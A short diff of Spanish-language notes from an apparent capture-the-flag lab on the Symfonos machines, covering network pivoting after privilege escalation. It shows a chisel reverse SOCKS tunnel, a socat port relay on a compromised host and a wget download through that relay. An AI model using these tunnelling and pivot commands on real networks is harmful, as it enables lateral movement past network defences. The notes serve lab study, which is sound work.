@@ -516,12 +516,14 @@ explotando este binario logramos conseguir una bash con privilegios elevados
 
 	*Symfonos-1*
 	./chisel client 10.0.2.4:8000 R:socks
-
+---------------------------------------------------------------------------------------------------------------------------------------
 	*Servidor Python: el servidor debe estar a la escucha en el mismo puerto donde se hace la conexion con socat*
 	python3 -m http.server 6666
 
 	*Maquina Symfonos-1*
 	./socat TCP-LISTEN:1331,fork TCP:10.0.2.4:6666
+
+	*abrimos un puerto en la maquina S*
 
 	*Maquina Symfonos-2*
 	wget http://10.2.2.6:1331/archivo
